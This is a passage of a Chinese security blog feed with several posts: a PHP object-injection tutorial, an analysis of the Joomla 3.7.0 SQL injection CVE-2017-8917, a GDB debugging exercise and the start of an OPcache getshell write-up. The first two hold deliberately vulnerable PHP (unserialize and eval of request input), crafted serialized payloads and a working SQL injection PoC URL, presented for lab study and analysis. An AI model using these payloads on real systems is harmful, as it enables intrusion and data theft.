<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><h4 id="wakeup-或-destruct"><a href="#wakeup-或-destruct" class="headerlink" title="__wakeup() 或__destruct()"></a>__wakeup() 或__destruct()</h4><p>由前可以看到，unserialize()后会导致__wakeup() 或__destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在__wakeup() 或__destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。这里针对 __wakeup() 场景做个实验。假设index源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</div><div class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;</div><div class="line">		fwrite($fp,<span class="keyword">$this</span>-&gt;test);</div><div class="line">		fclose($fp);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$class3 = $_GET[<span class="string">'test'</span>];</div><div class="line">print_r($class3);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">$class3_unser = unserialize($class3);</div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;</div><div class="line"><span class="comment">// 为显示效果，把这个shell.php包含进来</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>同目录下有个空的shell.php文件。一开始访问index.php。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/3.jpg?raw=true" alt=""></p>
<p>基本的思路是，本地搭建好环境，通过 serialize() 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “&lt;?php phpinfo(); ?&gt;”,再调用unserialize()时会通过__wakeup()把test的写入到shell.php中。为此我们写个php脚本：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</div><div class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;</div><div class="line">		fwrite($fp,<span class="keyword">$this</span>-&gt;test);</div><div class="line">		fclose($fp);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">$class4 = <span class="keyword">new</span> chybeta();</div><div class="line">$class4-&gt;test = <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>;	$class4_ser = serialize($class4);	print_r($class4_ser);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>由此得到序列化结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/4.jpg?raw=true" alt=""></p>
<h4 id="其他Magic-function的利用"><a href="#其他Magic-function的利用" class="headerlink" title="其他Magic function的利用"></a>其他Magic function的利用</h4><p>但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的__construct()，是不是就没有利用价值呢？非也。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ph0en1x</span></span>&#123;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span>&#123;</div><div class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;</div><div class="line">		fwrite($fp,$test);</div><div class="line">		fclose($fp);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</div><div class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">		$obj = <span class="keyword">new</span> ph0en1x(<span class="keyword">$this</span>-&gt;test);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$class5 = $_GET[<span class="string">'test'</span>];</div><div class="line">print_r($class5);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">$class5_unser = unserialize($class5);</div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 __wakeup()函数，从而在new ph0en1x()会自动调用对象ph0en1x中的__construct()方法，从而把<code>&lt;?php phpinfo() ?&gt;</code>写入到 shell.php中。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/5.jpg?raw=true" alt=""></p>
<h2 id="利用普通成员方法"><a href="#利用普通成员方法" class="headerlink" title="利用普通成员方法"></a>利用普通成员方法</h2><p>前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $test;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> ph0en1x();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;test-&gt;action();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ph0en1x</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"ph0en1x"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ph0en2x</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $test2;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$class6 = <span class="keyword">new</span> chybeta();</div><div class="line"></div><div class="line">unserialize($_GET[<span class="string">'test'</span>]);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>本意上，new一个新的chybeta对象后，调用__construct()，其中又new了ph0en1x对象。在结束后会调用__destruct()，其中会调用action()，从而输出 ph0en1x。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/6.jpg?raw=true" alt=""></p>
<p>下面是利用过程。构造序列化。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">class chybeta &#123;</div><div class="line">    var $test;</div><div class="line"></div><div class="line">    function __construct() &#123;</div><div class="line">        $this-&gt;test = new ph0en2x();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">class ph0en2x &#123;</div><div class="line">    var $test2 = &quot;phpinfo();&quot;;</div><div class="line"></div><div class="line">&#125;</div><div class="line">echo serialize(new chybeta());</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;O:7:&quot;ph0en2x&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</div></pre></td></tr></table></figure></p>
<p>传给index.php的test参数，利用成功：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/7.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php反序列化漏洞，又叫php对象注入漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="对象注入" scheme="http://yoursite.com/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析</title>
    <link href="http://yoursite.com/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection分析/</id>
    <published>2017-05-19T01:39:18.000Z</published>
    <updated>2017-05-19T09:48:14.439Z</updated>
    
    <content type="html"><![CDATA[<p>Joomla!3.7.0 Core SQL注入漏洞.<br><a id="more"></a></p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>这次干脆先放出poc吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/Joomla370/index.php?</div><div class="line">option=com_fields</div><div class="line">&amp;view=fields</div><div class="line">&amp;layout=modal</div><div class="line">&amp;list[fullordering]=updatexml(1,concat(0x3e,database()),0)</div></pre></td></tr></table></figure></p>
<p>这次根据参数的传入流程来进行分析。</p>
<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="危害组件"><a href="#危害组件" class="headerlink" title="危害组件"></a>危害组件</h2><p>3.7.0版本中出现了<code>com_field</code>组件,无需授权即可访问。查看<code>...\components\com_fields\controller.php</code>，在第27行左右，其相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config = array<span class="params">()</span>)</span></span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;input = JFactory::getApplication()-&gt;input;</div><div class="line"></div><div class="line">		<span class="comment">// Frontpage Editor Fields Button proxying:</span></div><div class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'view'</span>) === <span class="string">'fields'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'layout'</span>) === <span class="string">'modal'</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="comment">// Load the backend language file.</span></div><div class="line">			$lang = JFactory::getLanguage();</div><div class="line">			$lang-&gt;load(<span class="string">'com_fields'</span>, JPATH_ADMINISTRATOR);</div><div class="line"></div><div class="line">			$config[<span class="string">'base_path'</span>] = JPATH_COMPONENT_ADMINISTRATOR;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">parent</span>::__construct($config);</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>可以看到它先判断通过<code>view</code>是否等于<code>fields</code>,<code>layout</code>是否等于<code>modal</code>,而这两个参数都是我们可控的。若满足则将会加载<code>JPATH_ADMINISTRATOR</code>中的<code>com_fields</code>组件，并且将<code>base_path</code>设置为 <code>JPATH_COMPONENT_ADMINISTRATOR</code>，之后调用父类的构造方法。</p>
<h2 id="传入sql语句"><a href="#传入sql语句" class="headerlink" title="传入sql语句"></a>传入sql语句</h2><p>在调用父类构造方法后，一路运行到<code>...\Joomla370\libraries\legacy\controller\legacy.php</code>中，约莫707行，这时会通过<code>$this-&gt;$doTask</code>调用<code>display()</code>函数。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/calldisplay.jpg" alt=""></p>
<p>跟进<code>display()</code>函数，它位于 <code>...\Joomla370\libraries\legacy\controller\legacy.php</code>，接着运行至legacy.php的约莫671行左右，调用了视图（view）的<code>display()</code>函数。我们跟进一下，跳转进入<code>...\Joomla370\administrator\components\com_fields\views\fields\view.html.php</code>，</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/viewdisplay2.jpg?raw=true" alt=""></p>
<p>此时运行到，下面这条语句，给<code>get()</code>传入的参数为<code>State</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">$this</span>-&gt;state         = <span class="keyword">$this</span>-&gt;get(<span class="string">'State'</span>);</div></pre></td></tr></table></figure>
<p>我们跟进这个<code>get()</code>函数，一直运行到422行，</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/getState.jpg?raw=true" alt=""></p>
<p>之后将会调用 <code>getState()</code>，跟进，进入<code>...\Joomla370\libraries\legacy\model\legacy.php</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/callpopulateState.jpg" alt=""></p>
<p>之后会调用filedsModel类中的<code>populateState()</code>，跟进后会发现调用其父类的<code>populateState()</code>函数，其定义在 <code>...\Joomla370\libraries\legacy\model\list.php</code>中，约莫在第495行，相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">..省略..</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($list = $app-&gt;getUserStateFromRequest(<span class="keyword">$this</span>-&gt;context . <span class="string">'.list'</span>, <span class="string">'list'</span>, <span class="keyword">array</span>(), <span class="string">'array'</span>))</div><div class="line"></div><div class="line">..省略..</div></pre></td></tr></table></figure></p>
<p>这里我们先跟进一下<code>getUserStateFromRequest()</code>，它的定义在<code>...\Joomla370\libraries\cms\application\cms.php</code>中，在该函数结束后，它获取了我们通过get方法传入的参数，也就是说，我们成功的控制了<code>fullordering</code>的值。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/fullordering.jpg" alt=""></p>
<p>在该函数运行完后，流程将会回到前面的那个定义在<code>...\Joomla370\libraries\cms\application\cms.php</code>中的<code>populateState()</code>函数。此时运行的代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">foreach</span> ($list <span class="keyword">as</span> $name =&gt; $value)</div><div class="line">&#123;</div><div class="line">	<span class="comment">// Exclude if blacklisted</span></div><div class="line">	<span class="keyword">if</span> (!in_array($name, <span class="keyword">$this</span>-&gt;listBlacklist))</div><div class="line">	&#123;</div><div class="line">		<span class="comment">// Extra validations</span></div><div class="line">		<span class="keyword">switch</span> ($name)&#123;...&#125;</div><div class="line">		<span class="keyword">$this</span>-&gt;setState(<span class="string">'list.'</span> . $name, $value);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>如果数组的key不在黑名单（blacklisted）中，将会为<code>$list</code>变量根据相应的<code>State</code>进行注册，在这部分函数运行到结束部分，可以看见成功的控制了<code>list</code>数组的<code>fullordering</code>的值。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/thissetstate.jpg?raw=true" alt=""></p>
<p>查看变量，如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/arraylist.jpg?raw=true" alt=""></p>
<h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><p>接下来继续运行，一直运行回到<code>Joomla370\administrator\components\com_fields\views\fields\view.html.php</code>中的<code>display()</code>函数中。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/getitem.jpg?raw=true" alt=""></p>
<p>跟进这一行 <code>$this-&gt;get(&#39;Items&#39;);</code>，进入<code>...\Joomla370\libraries\legacy\view\legacy.php</code>，约莫在422行,这里的行为跟前面分析类似，此后将会调用<code>getitem()</code>：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/callgetitem.jpg?raw=true" alt=""></p>
<p>继续跟进，进入<code>...\Joomla370\libraries\legacy\model\list.php</code>，约莫在186行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span></div><div class="line">	&#123;</div><div class="line">		<span class="comment">// Load the list items and add the items to the internal cache.</span></div><div class="line">		<span class="keyword">$this</span>-&gt;cache[$store] = <span class="keyword">$this</span>-&gt;_getList(<span class="keyword">$this</span>-&gt;_getListQuery(), <span class="keyword">$this</span>-&gt;getStart(), <span class="keyword">$this</span>-&gt;getState(<span class="string">'list.limit'</span>));</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>通过<code>_getList</code>调用了<code>_getListQuery</code>,继续跟进，进入<code>...\Joomla370\libraries\legacy\model\list.php</code>，约莫在 132行，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if ($lastStoreId != $currentStoreId || empty($this-&gt;query))</div><div class="line">&#123;</div><div class="line">	$lastStoreId = $currentStoreId;</div><div class="line">	$this-&gt;query = $this-&gt;getListQuery();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>调用了 <code>getListQuery()</code>，继续跟进，进入 <code>...\Joomla370\administrator\components\com_fields\models\fields.php</code>,一直运行到约莫在 305 行，调用<code>getState</code>方法，传入<code>list.fullordering</code>参数。相关代码如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/listordering2.jpg?raw=true" alt=""></p>
<p>查看变量表：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/listfullordering3.jpg?raw=true" alt=""></p>
<p>之后在第314行，将<code>$listOrdering</code>带入查询，相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$query-&gt;order($db-&gt;escape($listOrdering) . <span class="string">' '</span> . $db-&gt;escape($orderDirn));</div></pre></td></tr></table></figure></p>
<p>在进行<code>$query-&gt;order</code>之前，会先进行一次过滤，跟进<code>$db-&gt;escape</code>，进入<code>...\Joomla370\libraries\joomla\database\driver\mysqli.php</code>，约莫242行，相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($text, $extra = false)</span></span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;connect();</div><div class="line"></div><div class="line">		$result = mysqli_real_escape_string(<span class="keyword">$this</span>-&gt;getConnection(), $text);</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ($extra)</div><div class="line">		&#123;</div><div class="line">			$result = addcslashes($result, <span class="string">'%_'</span>);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">return</span> $result;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>对于传入的<code>$text</code>通过<code>mysqli_real_escape_string()</code>进行过滤，只转义了一些字符。因此可以通过构造进行成功的注入。</p>
<h1 id="成功注入"><a href="#成功注入" class="headerlink" title="成功注入"></a>成功注入</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/poc.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Joomla!3.7.0 Core SQL注入漏洞.&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>一次水水的调试</title>
    <link href="http://yoursite.com/2017/05/16/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84GDB%E8%B0%83%E8%AF%95/"/>
    <id>http://yoursite.com/2017/05/16/一次简单的GDB调试/</id>
    <published>2017-05-16T14:48:05.000Z</published>
    <updated>2017-05-16T15:44:13.077Z</updated>
    
    <content type="html"><![CDATA[<p>Linux 作业…<br><a id="more"></a></p>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -g -O0 array.c main.c -o test</div></pre></td></tr></table></figure>
<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb test</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/1.jpg?raw=true" alt=""></p>
<p>通过list命令，可以显示出部分源代码，我们选择在源代码的第9行处下断点。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/2.jpg?raw=true" alt=""></p>
<p>通过print命令，可以查看变量的值，因为数组名已知，可以如下打印出数组的内容。可以发现，在还没有初始化或者赋值前，数组内容是随机化（或者说是垃圾数据）。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/3.jpg?raw=true" alt=""></p>
<p>此时程序运行到第9行附近，可以再次通过list命令显示其附近的源代码。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/4.jpg?raw=true" alt=""></p>
<p>这里为了方便，我们在第11，12，15行下下断点，分别对应两个<code>array_fill_with()</code> 函数 和 <code>array_add()</code>函数。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/5.jpg?raw=true" alt=""></p>
<p>接下来单步调试，命令是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ n</div></pre></td></tr></table></figure>
<p>此时在执行完第11行的<code>array_fill_with()</code>,即已经完成了对数组<code>vector_a</code>的赋值后，我们查看下三个数组的值。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/7.jpg?raw=true" alt=""></p>
<p>数组<code>vector_a</code>全被赋值为<code>10</code>在意料之中（0xa == 10 ），但注意数组<code>vector_b</code>的第一个元素也被赋值为<code>0xa</code>了。在前面可知，数组<code>vector_b</code>的第一个元素原本是<code>0xff00</code>。所以这边可能产生了一个越界。</p>
<p>下一条语句是对数组<code>vector_b</code>进行赋值，这次我们选择进入函数<code>array_fill_with()</code>，即进行<code>step into</code>，gdb中相应的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ s</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170516/8.jpg?raw=true" alt=""></p>
<p>由上图，通过<code>list</code>命令，可知我们已经进入到了<code>array.c</code>中的第七行，正在进行一个循环。其中变量<code>length</code>的值为<code>0x10</code>，即为16。</p>
<p>我们知道，在C语言中，数组下标是从0开始的，这里也就解释了为什么我们再对数组<code>vector_a</code>赋值完后，数组<code>vector_b</code>的第一个元素也被改变了。</p>
<p>接下来我们继续运行程序，命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ c</div></pre></td></tr></table></figure></p>
<p>此时，已经完成了对数组<code>vector_b</code>的赋值，我们可以推测数组<code>vector_c</code>的第一个元素也会被从原先的 0x0 改为 0x37。事实证明，推测是正确的，见下图：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170516/9.jpg" alt=""></p>
<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p>其实重点就一个，C语言中数组下标从0开始的。<br>把<code>array.c</code>中的<code>i &lt;= length</code> 改为 <code>i &lt; length</code>就ok啦。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Linux 作业…&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>利用PHP的OPcache机制getshell</title>
    <link href="http://yoursite.com/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/"/>
    <id>http://yoursite.com/2017/05/13/利用PHP的OPcache机制getshell/</id>
    <published>2017-05-13T15:04:03.000Z</published>
    <updated>2017-06-20T04:38:00.668Z</updated>
    
    <content type="html"><![CDATA[<p>OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。<br>本文是对 <a href="http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/" target="_blank" rel="external">《binary-webshell-through-opcache-in-php-7》</a>一文的测试。<br><a id="more"></a></p>
<h1 id="关于OPcache"><a href="#关于OPcache" class="headerlink" title="关于OPcache"></a>关于OPcache</h1><p>在我们指定了一个缓存目录（后面提到）后，php会把编译好的php字节码文件放到这个缓存目录中。这里假设该缓存目录是<code>/var/www/html/opcache</code>，未访问前，<code>opcache</code>文件夹为空。接下去我去访问 <code>index.php</code>后，php会在 <code>opcache</code>文件夹中创建一个名为md5哈希值的文件夹，其下的目录结构和 <code>index.php</code>所在目录结构相同，同时生成了 <code>index.php.bin</code>。</p>
